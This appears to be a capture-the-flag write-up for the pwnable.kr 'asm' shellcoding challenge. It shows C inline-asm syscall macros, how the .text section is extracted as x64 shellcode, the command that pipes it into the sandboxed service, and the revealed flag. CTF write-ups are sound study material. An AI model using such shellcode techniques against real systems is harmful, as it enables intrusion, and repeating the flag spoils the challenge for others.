### asm

even just to compile the code took me time to understand even after adding the -lseccopm flag.
Apparently the flag should be in the end, and I also did `sudo apt-get install libseccomp-dev`
`gcc asm_with_doc.c -o asm_with_doc -lseccomp`
the code `memset` the `sh` buffer with `0x90` which is `nop`
Lets see what is the rest of the code:
```
$ echo -e -n "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff" > code.txt

$ objdump -D -b binary -m i386 code.txt 

code.txt:     file format binary


Disassembly of section .data:

00000000 <.data>:
   0:	48                   	dec    %eax
   1:	31 c0                	xor    %eax,%eax
   3:	48                   	dec    %eax
   4:	31 db                	xor    %ebx,%ebx
   6:	48                   	dec    %eax
   7:	31 c9                	xor    %ecx,%ecx
   9:	48                   	dec    %eax
   a:	31 d2                	xor    %edx,%edx
   c:	48                   	dec    %eax
   d:	31 f6                	xor    %esi,%esi
   f:	48                   	dec    %eax
  10:	31 ff                	xor    %edi,%edi
  12:	48                   	dec    %eax
  13:	31 ed                	xor    %ebp,%ebp
  15:	4d                   	dec    %ebp
  16:	31 c0                	xor    %eax,%eax
  18:	4d                   	dec    %ebp
  19:	31 c9                	xor    %ecx,%ecx
  1b:	4d                   	dec    %ebp
  1c:	31 d2                	xor    %edx,%edx
  1e:	4d                   	dec    %ebp
  1f:	31 db                	xor    %ebx,%ebx
  21:	4d                   	dec    %ebp
  22:	31 e4                	xor    %esp,%esp
  24:	4d                   	dec    %ebp
  25:	31 ed                	xor    %ebp,%ebp
  27:	4d                   	dec    %ebp
  28:	31 f6                	xor    %esi,%esi
  2a:	4d                   	dec    %ebp
  2b:	31 ff                	xor    %edi,%edi

```
`dec` is "Decrease by 1" and the xor of a register with itself resets it to 0.
So it clears all the registers.

I need to write the name of the long file to a buffer such that the string itself is part
of the `.text` segment. Doing somthing like `char file[] = {'t','h','i' ...}`
didn't work, so I wrote a python stuff that generates the right C code:
```
$ python3
Python 3.6.5 (default, Apr  1 2018, 05:46:30) 
[GCC 7.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> a= 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
>>> b = list(a)
>>> for i in range(len(b)):
...     b[i] = "file[%d] = '%s';" % (i,b[i])
>>> for x in b:
...     print(x)
```
Now, the code should be self contained so it should implement the system calls.
After a samll research and reading I got it:
```
#define mysyscall3(name,ret,arg1,arg2,arg3)     \
 __asm__ volatile("syscall"                     \
                  : "=a"( ret )                 \
                  : "a"( __NR_##name ),         \
                    "D"( arg1 ),                \
                    "S"( arg2 ),                \
                    "d"( arg3 )                 \
                  : "memory", "rcx", "r11"      \
                  );

#define mysyscall1(name,ret,arg1)                               \
 __asm__ volatile ("syscall"                                     \
                   : "=a" (ret)                                 \
                   : "a" (__NR_##name),"D" (arg1));
````
Note that after the read and the write there should be a call to `exit` otherwise 
there will be a seg fault and the file input might not be wrriten.
So the code that calls the sys calls looks like
```
 int fd;
 int ret;

 mysyscall3(open,fd,file,0000,0);
 char buf[129];
   buf[128] = '\0';
 buf[127] = '\n';
 mysyscall3(read,ret,fd,buf,128);
 mysyscall3(write,ret,1,buf,128);
 mysyscall1(exit,ret,123);
``` 
Then compiled with:
```
$ gcc read_flag64.c -o read_flag64 -nostdlib
```
Then for taking  only the text segment:
```
$ objcopy --dump-section .text=output.bin read_flag64
```
and:
```
$ cat output.bin | ./asm
```
Then I found out that output.bin is larger than 1000 and the `asm` program reads up to 100 bytes, so I replaced some of identical `file[x] = 'o'` and `file[x] = '0'`
with `for` loops.
The final code is in `read_flag64_prepare.c`

 layout in the pwnable server is a bit different then the one compiled locally.
So better investigating directly in the site
This is what I found:
```
asm@ubuntu:/tmp$ cd /tmp
asm@ubuntu:/tmp$ vim read_da.c
asm@ubuntu:/tmp$ gcc read_da.c -nostdlib
asm@ubuntu:/tmp$ objcopy --dump-section .text=output.binxx a.out
asm@ubuntu:/tmp$ cat output.binxx | nc 0 9026
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
give me your x64 shellcode: Mak1ng_shelLcodE_i5_veRy_eaSy
�&.�k`>�+}S�k�
```
